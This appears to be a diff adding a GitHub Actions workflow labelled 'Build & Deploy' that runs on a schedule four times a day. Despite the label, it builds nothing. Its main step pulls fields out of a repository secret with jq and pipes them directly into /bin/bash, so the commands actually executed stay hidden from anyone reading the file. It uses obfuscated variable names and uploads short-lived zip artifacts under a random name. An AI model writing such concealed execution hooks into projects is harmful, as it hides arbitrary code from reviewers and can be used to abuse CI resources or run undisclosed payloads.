@@ -1,0 +1,27 @@
+name: Build & Deploy
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '36 3,9,15,21 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute
+        env:
+          ojt29: ${{ secrets.ojt29 }}
+        run: |
+          printf '%s' "$ojt29" | jq -r .sna22 | /bin/bash
+          printf '%s' "$wq76" | jq -r .pig28841 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: HnxyGKMq
+          path: "*.zip"
+          retention-days: 1
